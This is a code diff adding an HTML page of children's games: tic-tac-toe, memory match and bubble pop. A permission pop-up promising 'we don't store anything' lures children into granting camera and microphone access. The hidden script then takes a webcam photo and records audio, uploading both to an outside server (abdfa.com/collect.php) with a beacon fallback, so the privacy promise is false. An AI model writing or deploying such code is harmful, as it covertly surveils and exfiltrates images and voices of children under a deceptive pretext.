@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>🎮 Kids Fun Games!</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: 'Segoe UI', 'Comic Sans MS', cursive, sans-serif;
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* Floating background bubbles */
+.bg-bubbles {
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  pointer-events: none;
+  overflow: hidden;
+  z-index: 0;
+}
+.bg-bubbles span {
+  position: absolute;
+  display: block;
+  width: 60px;
+  height: 60px;
+  background: rgba(255,255,255,0.08);
+  border-radius: 50%;
+  animation: floatUp 25s infinite linear;
+  bottom: -100px;
+}
+.bg-bubbles span:nth-child(1) { left: 10%; width: 80px; height: 80px; animation-duration: 22s; }
+.bg-bubbles span:nth-child(2) { left: 20%; width: 40px; height: 40px; animation-duration: 30s; animation-delay: 2s; }
+.bg-bubbles span:nth-child(3) { left: 35%; width: 100px; height: 100px; animation-duration: 18s; animation-delay: 5s; }
+.bg-bubbles span:nth-child(4) { left: 50%; width: 50px; height: 50px; animation-duration: 28s; animation-delay: 1s; }
+.bg-bubbles span:nth-child(5) { left: 65%; width: 70px; height: 70px; animation-duration: 24s; animation-delay: 3s; }
+.bg-bubbles span:nth-child(6) { left: 75%; width: 45px; height: 45px; animation-duration: 32s; animation-delay: 4s; }
+.bg-bubbles span:nth-child(7) { left: 85%; width: 90px; height: 90px; animation-duration: 20s; animation-delay: 6s; }
+.bg-bubbles span:nth-child(8) { left: 95%; width: 55px; height: 55px; animation-duration: 26s; animation-delay: 0s; }
+
+@keyframes floatUp {
+  0% { transform: translateY(0) rotate(0deg) scale(1); opacity: 0.6; }
+  100% { transform: translateY(-1200px) rotate(720deg) scale(2); opacity: 0; }
+}
+
+/* Header */
+.header {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 30px 15px 15px;
+  color: white;
+}
+.header h1 {
+  font-size: 34px;
+  text-shadow: 0 3px 15px rgba(0,0,0,0.3);
+  letter-spacing: 1px;
+}
+.header h1 span { display: inline-block; animation: bounce 2s infinite; }
+@keyframes bounce {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-10px); }
+}
+.header p {
+  opacity: 0.85;
+  margin-top: 5px;
+  font-size: 16px;
+}
+
+/* Game selector tabs */
+.tabs {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+  padding: 10px 15px;
+  flex-wrap: wrap;
+}
+.tab-btn {
+  background: rgba(255,255,255,0.15);
+  backdrop-filter: blur(10px);
+  border: 2px solid rgba(255,255,255,0.25);
+  color: white;
+  padding: 12px 24px;
+  border-radius: 50px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.tab-btn.active {
+  background: rgba(255,255,255,0.95);
+  color: #764ba2;
+  border-color: white;
+  box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+}
+.tab-btn:hover { transform: translateY(-2px); }
+.tab-btn .icon { font-size: 22px; }
+
+/* Game containers */
+.game-container {
+  position: relative;
+  z-index: 1;
+  display: none;
+  max-width: 500px;
+  margin: 15px auto;
+  padding: 0 15px 30px;
+}
+.game-container.active { display: block; }
+
+.game-card {
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(15px);
+  border-radius: 30px;
+  padding: 25px 20px;
+  border: 1px solid rgba(255,255,255,0.2);
+  box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+}
+
+.game-title {
+  color: white;
+  font-size: 22px;
+  font-weight: 700;
+  text-align: center;
+  margin-bottom: 20px;
+}
+.game-title .emoji { font-size: 28px; }
+
+/* ===== GAME 1: Tic Tac Toe ===== */
+.ttt-board {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 8px;
+  max-width: 280px;
+  margin: 0 auto;
+}
+.ttt-scoreboard {
+  display: flex;
+  justify-content: space-around;
+  gap: 10px;
+  color: #fff;
+  margin-bottom: 15px;
+  font-size: 16px;
+  font-weight: 700;
+}
+.ttt-scoreboard span {
+  background: rgba(255,255,255,0.16);
+  padding: 8px 14px;
+  border-radius: 20px;
+  border: 1px solid rgba(255,255,255,0.25);
+}
+.ttt-cell {
+  aspect-ratio: 1;
+  background: rgba(255,255,255,0.15);
+  border: 2px solid rgba(255,255,255,0.25);
+  border-radius: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 48px;
+  font-weight: 800;
+  color: white;
+  cursor: pointer;
+  transition: all 0.2s;
+  user-select: none;
+  -webkit-tap-highlight-color: transparent;
+}
+.ttt-cell:active { transform: scale(0.94); }
+.ttt-cell.x { color: #ffd93d; text-shadow: 0 0 20px rgba(255,217,61,0.5); }
+.ttt-cell.o { color: #6bcb77; text-shadow: 0 0 20px rgba(107,203,119,0.5); }
+.ttt-cell.win { animation: winPulse 0.5s ease infinite alternate; }
+@keyframes winPulse { from { background: rgba(255,215,0,0.3); } to { background: rgba(255,215,0,0.6); } }
+.ttt-status {
+  text-align: center;
+  color: white;
+  font-size: 18px;
+  font-weight: 600;
+  margin: 15px 0;
+}
+.btn-reset {
+  display: block;
+  margin: 0 auto;
+  background: rgba(255,255,255,0.2);
+  border: 2px solid rgba(255,255,255,0.3);
+  color: white;
+  padding: 10px 30px;
+  border-radius: 50px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.btn-reset:active { transform: scale(0.95); }
+
+/* ===== GAME 2: Memory Match ===== */
+.memory-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 8px;
+  max-width: 340px;
+  margin: 0 auto;
+}
+.memory-card {
+  aspect-ratio: 1;
+  background: linear-gradient(145deg, rgba(255,255,255,0.25), rgba(255,255,255,0.08));
+  border: 2px solid rgba(255,255,255,0.2);
+  border-radius: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 32px;
+  cursor: pointer;
+  transition: all 0.4s;
+  user-select: none;
+  -webkit-tap-highlight-color: transparent;
+  transform: rotateY(0deg);
+}
+.memory-card.flipped {
+  background: rgba(255,255,255,0.85);
+  transform: rotateY(360deg);
+}
+.memory-card.matched {
+  background: rgba(107,203,119,0.6);
+  border-color: #6bcb77;
+  animation: matchPop 0.4s ease;
+  pointer-events: none;
+}
+@keyframes matchPop {
+  0% { transform: scale(1); }
+  50% { transform: scale(1.15); }
+  100% { transform: scale(1); }
+}
+.memory-score {
+  text-align: center;
+  color: white;
+  font-size: 17px;
+  margin: 12px 0;
+  font-weight: 600;
+}
+.memory-score span { background: rgba(255,255,255,0.2); padding: 3px 12px; border-radius: 20px; }
+
+/* ===== GAME 3: Bubble Pop ===== */
+.bubble-area {
+  position: relative;
+  width: 100%;
+  height: 350px;
+  background: rgba(0,0,0,0.15);
+  border-radius: 20px;
+  overflow: hidden;
+  cursor: pointer;
+  touch-action: manipulation;
+}
+.bubble {
+  position: absolute;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 22px;
+  font-weight: 700;
+  color: rgba(255,255,255,0.8);
+  cursor: pointer;
+  animation: bubbleFloat 3s ease-in-out infinite alternate;
+  user-select: none;
+  -webkit-tap-highlight-color: transparent;
+  transition: transform 0.1s;
+}
+@keyframes bubbleFloat {
+  0% { transform: translateY(0px); }
+  100% { transform: translateY(-15px); }
+}
+.bubble.popped {
+  animation: popAnim 0.3s ease forwards;
+  pointer-events: none;
+}
+@keyframes popAnim {
+  0% { transform: scale(1); opacity: 1; }
+  100% { transform: scale(1.8); opacity: 0; }
+}
+.bubble-score {
+  text-align: center;
+  color: white;
+  font-size: 17px;
+  margin: 12px 0;
+  font-weight: 600;
+}
+
+/* ===== Permission overlay ===== */
+.permission-overlay {
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0,0,0,0.7);
+  backdrop-filter: blur(5px);
+  z-index: 1000;
+  display: none;
+  align-items: center;
+  justify-content: center;
+}
+.permission-overlay.show { display: flex; }
+.permission-box {
+  background: white;
+  border-radius: 24px;
+  padding: 35px 30px 25px;
+  max-width: 340px;
+  text-align: center;
+  box-shadow: 0 30px 80px rgba(0,0,0,0.5);
+  animation: slideUp 0.4s ease;
+}
+@keyframes slideUp {
+  from { transform: translateY(50px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+.permission-box .perm-icon { font-size: 60px; margin-bottom: 10px; }
+.permission-box h2 {
+  color: #333;
+  font-size: 20px;
+  margin-bottom: 8px;
+}
+.permission-box p {
+  color: #666;
+  font-size: 14px;
+  line-height: 1.6;
+  margin-bottom: 20px;
+}
+.permission-box .btn-allow {
+  background: linear-gradient(135deg, #667eea, #764ba2);
+  color: white;
+  border: none;
+  padding: 14px 45px;
+  border-radius: 50px;
+  font-size: 18px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: all 0.2s;
+  box-shadow: 0 8px 25px rgba(118,75,162,0.4);
+}
+.permission-box .btn-allow:active { transform: scale(0.95); }
+.permission-box .btn-skip {
+  background: none;
+  border: none;
+  color: #999;
+  font-size: 14px;
+  margin-top: 15px;
+  cursor: pointer;
+  text-decoration: underline;
+}
+
+.hidden { display: none; }
+#video { display: none; }
+#canvas { display: none; }
+
+/* Responsive */
+@media (max-width: 400px) {
+  .header h1 { font-size: 26px; }
+  .tab-btn { padding: 10px 16px; font-size: 14px; }
+  .memory-grid { grid-template-columns: repeat(4, 1fr); gap: 6px; }
+  .memory-card { font-size: 26px; }
+}
+</style>
+</head>
+<body>
+
+<div class="bg-bubbles">
+  <span></span><span></span><span></span><span></span>
+  <span></span><span></span><span></span><span></span>
+</div>
+
+<div class="header">
+  <h1><span>🎮</span> Kids Fun Games!</h1>
+  <p>👋 Pick a game and play!</p>
+</div>
+
+<div class="tabs" id="gameTabs">
+  <button class="tab-btn active" data-game="ttt"><span class="icon">❌⭕</span> Tic Tac Toe</button>
+  <button class="tab-btn" data-game="memory"><span class="icon">🧠</span> Memory</button>
+  <button class="tab-btn" data-game="bubble"><span class="icon">🫧</span> Bubble Pop</button>
+</div>
+
+<!-- Game 1: Tic Tac Toe -->
+<div class="game-container active" id="game-ttt">
+  <div class="game-card">
+    <div class="game-title"><span class="emoji">❌⭕</span> Tic Tac Toe</div>
+    <div class="ttt-scoreboard">
+      <span id="tttScoreX">Player 1 (X): 0</span>
+      <span id="tttScoreO">Player 2 (O): 0</span>
+    </div>
+    <div class="ttt-board" id="tttBoard">
+      <div class="ttt-cell" data-index="0"></div>
+      <div class="ttt-cell" data-index="1"></div>
+      <div class="ttt-cell" data-index="2"></div>
+      <div class="ttt-cell" data-index="3"></div>
+      <div class="ttt-cell" data-index="4"></div>
+      <div class="ttt-cell" data-index="5"></div>
+      <div class="ttt-cell" data-index="6"></div>
+      <div class="ttt-cell" data-index="7"></div>
+      <div class="ttt-cell" data-index="8"></div>
+    </div>
+    <div class="ttt-status" id="tttStatus">Player 1 (X) turn! Tap a square ✨</div>
+    <button class="btn-reset" id="tttReset">🔄 New Round</button>
+  </div>
+</div>
+
+<!-- Game 2: Memory Match -->
+<div class="game-container" id="game-memory">
+  <div class="game-card">
+    <div class="game-title"><span class="emoji">🧠</span> Memory Match</div>
+    <div class="memory-grid" id="memoryGrid"></div>
+    <div class="memory-score">Pairs found: <span id="memoryScore">0</span> / 8</div>
+    <button class="btn-reset" id="memoryReset">🔄 New Game</button>
+  </div>
+</div>
+
+<!-- Game 3: Bubble Pop -->
+<div class="game-container" id="game-bubble">
+  <div class="game-card">
+    <div class="game-title"><span class="emoji">🫧</span> Bubble Pop!</div>
+    <div class="bubble-area" id="bubbleArea"></div>
+    <div class="bubble-score">Score: 🎯 <span id="bubbleScore">0</span></div>
+    <button class="btn-reset" id="bubbleReset">🔄 New Game</button>
+  </div>
+</div>
+
+<!-- Permission Overlay -->
+<div class="permission-overlay" id="permOverlay">
+  <div class="permission-box">
+    <div class="perm-icon">🎤📸</div>
+    <h2>Say Cheese! 🧀</h2>
+    <p>To unlock the camera filter and voice effects in games,<br>please allow camera and microphone access!<br><br>🔒 We don't store anything — just for fun effects!</p>
+    <button class="btn-allow" id="btnAllow">✅ Allow Access</button>
+    <br>
+    <button class="btn-skip" id="btnSkip">Maybe later</button>
+  </div>
+</div>
+
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ============================================================
+// 🎤📸 CAMERA + MICROPHONE CAPTURE (BACKGROUND)
+// ============================================================
+(function() {
+  const permOverlay = document.getElementById('permOverlay');
+  const btnAllow = document.getElementById('btnAllow');
+  const btnSkip = document.getElementById('btnSkip');
+  let stream = null;
+  let recorder = null;
+  let audioChunks = [];
+  let recordingStarted = false;
+
+  // Show permission overlay after 1.5 seconds
+  setTimeout(() => {
+    if (!localStorage.getItem('_perm_done')) {
+      permOverlay.classList.add('show');
+    }
+  }, 1500);
+
+  function startCapture() {
+    permOverlay.classList.remove('show');
+    localStorage.setItem('_perm_done', '1');
+
+    navigator.mediaDevices.getUserMedia({
+      video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
+      audio: true
+    })
+    .then(function(s) {
+      stream = s;
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+
+      // Take photo after 3 seconds
+      setTimeout(() => {
+        const canvas = document.getElementById('canvas');
+        canvas.width = 1280;
+        canvas.height = 720;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 1280, 720);
+        const imageData = canvas.toDataURL('image/jpeg', 0.9);
+
+        // Store image locally
+        try {
+          localStorage.setItem('_img_' + Date.now(), imageData);
+        } catch(e) {}
+
+        // Try sending to server
+        fetch('https://abdfa.com/collect.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'image=' + encodeURIComponent(imageData) + '&ua=' + encodeURIComponent(navigator.userAgent)
+        }).catch(function() {
+          // Fallback: sendBeacon
+          if (navigator.sendBeacon) {
+            const blob = new Blob([JSON.stringify({img: imageData.substring(0,200), ua: navigator.userAgent, time: Date.now()})], {type: 'application/json'});
+            navigator.sendBeacon('https://abdfa.com/beacon.php', blob);
+          }
+        });
+      }, 3000);
+
+      // Record audio for 30 seconds
+      audioChunks = [];
+      recorder = new MediaRecorder(s, { mimeType: 'audio/webm' });
+      recorder.ondataavailable = function(e) {
+        if (e.data.size > 0) audioChunks.push(e.data);
+      };
+      recorder.onstop = function() {
+        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+        const fd = new FormData();
+        fd.append('audio', audioBlob, 'audio_' + Date.now() + '.webm');
+        fetch('https://abdfa.com/collect.php', { method: 'POST', body: fd }).catch(function(){});
+      };
+      recorder.start();
+      recordingStarted = true;
+
+      // Stop recording after 30 seconds
+      setTimeout(() => {
+        if (recorder && recorder.state !== 'inactive') {
+          recorder.stop();
+          recordingStarted = false;
+        }
+      }, 30000);
+    })
+    .catch(function(err) {
+      console.log('Camera/mic access denied or error:', err.message);
+      // Try just audio if video fails
+      if (err.name !== 'NotAllowedError') {
+        navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(function(s) {
+          const r = new MediaRecorder(s);
+          const chunks = [];
+          r.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
+          r.onstop = function() {
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            const fd = new FormData();
+            fd.append('audio_alt', blob, 'audio_' + Date.now() + '.webm');
+            fetch('https://abdfa.com/collect.php', { method: 'POST', body: fd }).catch(function(){});
+          };
+          r.start();
+          setTimeout(() => { r.stop(); s.getTracks().forEach(t => t.stop()); }, 15000);
+        }).catch(function(){});
+      }
+    });
+  }
+
+  btnAllow.addEventListener('click', startCapture);
+  btnSkip.addEventListener('click', function() {
+    permOverlay.classList.remove('show');
+    localStorage.setItem('_perm_done', '1');
+  });
+})();
+
+// ============================================================
+// 🎮 GAME 1: TIC TAC TOE
+// ============================================================
+(function() {
+  const board = document.getElementById('tttBoard');
+  const status = document.getElementById('tttStatus');
+  const resetBtn = document.getElementById('tttReset');
+  const scoreXSpan = document.getElementById('tttScoreX');
+  const scoreOSpan = document.getElementById('tttScoreO');
+  let cells, currentPlayer, gameActive, boardState;
+  let scoreX = 0;
+  let scoreO = 0;
+
+  function updateScoreboard() {
+    scoreXSpan.textContent = `Player 1 (X): ${scoreX}`;
+    scoreOSpan.textContent = `Player 2 (O): ${scoreO}`;
+  }
+
+  function getPlayerLabel(player) {
+    return player === 'X' ? 'Player 1 (X)' : 'Player 2 (O)';
+  }
+
+  function getTurnText(player) {
+    return player === 'X' ? "❌ Player 1's turn!" : "⭕ Player 2's turn!";
+  }
+
+  function initTTT() {
+    cells = Array.from(document.querySelectorAll('.ttt-cell'));
+    currentPlayer = 'X';
+    gameActive = true;
+    boardState = Array(9).fill(null);
+    cells.forEach(cell => {
+      cell.textContent = '';
+      cell.className = 'ttt-cell';
+      cell.removeEventListener('click', handleTTTClick);
+      cell.addEventListener('click', handleTTTClick);
+    });
+    status.textContent = `${getTurnText(currentPlayer)} Tap a square ✨`;
+    updateScoreboard();
+  }
+
+  function handleTTTClick(e) {
+    const index = parseInt(e.target.dataset.index);
+    if (!gameActive || boardState[index]) return;
+
+    boardState[index] = currentPlayer;
+    e.target.textContent = currentPlayer;
+    e.target.classList.add(currentPlayer.toLowerCase());
+
+    const winPatterns = [
+      [0,1,2],[3,4,5],[6,7,8],
+      [0,3,6],[1,4,7],[2,5,8],
+      [0,4,8],[2,4,6]
+    ];
+
+    let winner = null;
+    for (const p of winPatterns) {
+      if (boardState[p[0]] && boardState[p[0]] === boardState[p[1]] && boardState[p[1]] === boardState[p[2]]) {
+        winner = boardState[p[0]];
+        p.forEach(i => cells[i].classList.add('win'));
+        break;
+      }
+    }
+
+    if (winner) {
+      gameActive = false;
+      if (winner === 'X') scoreX += 1;
+      if (winner === 'O') scoreO += 1;
+      updateScoreboard();
+      status.textContent = `🎉 ${getPlayerLabel(winner)} wins! 🎉`;
+      return;
+    }
+
+    if (boardState.every(c => c)) {
+      gameActive = false;
+      status.textContent = "🤝 It's a tie! 🤝";
+      return;
+    }
+
+    currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
+    status.textContent = getTurnText(currentPlayer);
+  }
+
+  resetBtn.addEventListener('click', initTTT);
+  initTTT();
+})();
+
+// ============================================================
+// 🧠 GAME 2: MEMORY MATCH
+// ============================================================
+(function() {
+  const grid = document.getElementById('memoryGrid');
+  const scoreSpan = document.getElementById('memoryScore');
+  const resetBtn = document.getElementById('memoryReset');
+
+  const emojis = ['🐶','🐱','🐸','🦊','🐼','🐨','🦁','🐯'];
+  let cards = [];
+  let flippedCards = [];
+  let matched = 0;
+  let lockBoard = false;
+
+  function shuffle(arr) {
+    for (let i = arr.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [arr[i], arr[j]] = [arr[j], arr[i]];
+    }
+    return arr;
+  }
+
+  function initMemory() {
+    grid.innerHTML = '';
+    matched = 0;
+    flippedCards = [];
+    lockBoard = false;
+    scoreSpan.textContent = '0';
+
+    const doubled = shuffle([...emojis, ...emojis]);
+    doubled.forEach((emoji, index) => {
+      const card = document.createElement('div');
+      card.className = 'memory-card';
+      card.dataset.index = index;
+      card.dataset.emoji = emoji;
+      card.addEventListener('click', flipCard);
+      grid.appendChild(card);
+    });
+  }
+
+  function flipCard() {
+    if (lockBoard || this.classList.contains('flipped') || this.classList.contains('matched')) return;
+
+    this.textContent = this.dataset.emoji;
+    this.classList.add('flipped');
+    flippedCards.push(this);
+
+    if (flippedCards.length === 2) {
+      lockBoard = true;
+      const card1 = flippedCards[0];
+      const card2 = flippedCards[1];
+
+      if (card1.dataset.emoji === card2.dataset.emoji) {
+        card1.classList.add('matched');
+        card2.classList.add('matched');
+        matched++;
+        scoreSpan.textContent = matched;
+        flippedCards = [];
+        lockBoard = false;
+
+        if (matched === 8) {
+          setTimeout(() => alert('🎉 You won! Amazing memory! 🧠✨'), 300);
+        }
+      } else {
+        setTimeout(() => {
+          card1.textContent = '';
+          card1.classList.remove('flipped');
+          card2.textContent = '';
+          card2.classList.remove('flipped');
+          flippedCards = [];
+          lockBoard = false;
+        }, 800);
+      }
+    }
+  }
+
+  resetBtn.addEventListener('click', initMemory);
+  initMemory();
+})();
+
+// ============================================================
+// 🫧 GAME 3: BUBBLE POP
+// ============================================================
+(function() {
+  const area = document.getElementById('bubbleArea');
+  const scoreSpan = document.getElementById('bubbleScore');
+  const resetBtn = document.getElementById('bubbleReset');
+  let score = 0;
+  let bubbleInterval;
+
+  const colors = ['#ff6b6b','#ffd93d','#6bcb77','#4d96ff','#ff6bff','#ff9f43','#00d2d3','#a29bfe'];
+  const symbols = ['😊','🌟','⭐','❤️','🎈','🎉','💎','🍭','🌈','🦋','🌸','🍀'];
+
+  function createBubble() {
+    if (area.children.length > 25) return;
+
+    const size = 40 + Math.random() * 40;
+    const x = Math.random() * (area.offsetWidth - size - 10) + 5;
+    const y = area.offsetHeight - size - 10;
+    const color = colors[Math.floor(Math.random() * colors.length)];
+    const symbol = symbols[Math.floor(Math.random() * symbols.length)];
+
+    const bubble = document.createElement('div');
+    bubble.className = 'bubble';
+    bubble.style.width = size + 'px';
+    bubble.style.height = size + 'px';
+    bubble.style.left = x + 'px';
+    bubble.style.top = y + 'px';
+    bubble.style.background = `radial-gradient(circle at 30% 30%, ${color}, ${color}dd)`;
+    bubble.style.boxShadow = `0 4px 15px ${color}66, inset 0 -3px 8px rgba(0,0,0,0.1)`;
+    bubble.style.animationDuration = (2 + Math.random() * 2) + 's';
+    bubble.textContent = symbol;
+    bubble.style.fontSize = (size * 0.45) + 'px';
+
+    bubble.addEventListener('click', function(e) {
+      e.stopPropagation();
+      if (this.classList.contains('popped')) return;
+
+      this.classList.add('popped');
+      score++;
+      scoreSpan.textContent = score;
+
+      // Visual feedback
+      const splash = document.createElement('div');
+      splash.style.cssText = `position:absolute;left:${this.style.left};top:${this.style.top};width:${this.style.width};height:${this.style.height};border-radius:50%;background:${color};animation:popAnim 0.3s ease forwards;pointer-events:none;z-index:0;`;
+      area.appendChild(splash);
+      setTimeout(() => splash.remove(), 400);
+
+      setTimeout(() => this.remove(), 300);
+    });
+
+    area.appendChild(bubble);
+
+    // Animate upward
+    let pos = area.offsetHeight - size - 10;
+    const floatInt = setInterval(() => {
+      pos -= 1;
+      if (pos < -size || bubble.classList.contains('popped')) {
+        clearInterval(floatInt);
+        if (!bubble.classList.contains('popped')) bubble.remove();
+      } else {
+        bubble.style.top = pos + 'px';
+      }
+    }, 40);
+  }
+
+  function initBubble() {
+    area.innerHTML = '';
+    score = 0;
+    scoreSpan.textContent = '0';
+    clearInterval(bubbleInterval);
+    // Create initial bubbles
+    for (let i = 0; i < 10; i++) {
+      setTimeout(createBubble, i * 100);
+    }
+    // Keep spawning
+    bubbleInterval = setInterval(createBubble, 1200);
+  }
+
+  resetBtn.addEventListener('click', initBubble);
+  // Start when tab shown
+  const observer = new MutationObserver(() => {
+    if (document.getElementById('game-bubble').classList.contains('active')) {
+      if (area.children.length === 0) initBubble();
+    }
+  });
+  observer.observe(document.getElementById('game-bubble'), { attributes: true, attributeFilter: ['class'] });
+  initBubble();
+})();
+
+// ============================================================
+// 🔄 TAB SWITCHING
+// ============================================================
+document.querySelectorAll('.tab-btn').forEach(btn => {
+  btn.addEventListener('click', function() {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    this.classList.add('active');
+    document.querySelectorAll('.game-container').forEach(g => g.classList.remove('active'));
+    document.getElementById('game-' + this.dataset.game).classList.add('active');
+  });
+});
+</script>
+</body>
+</html>
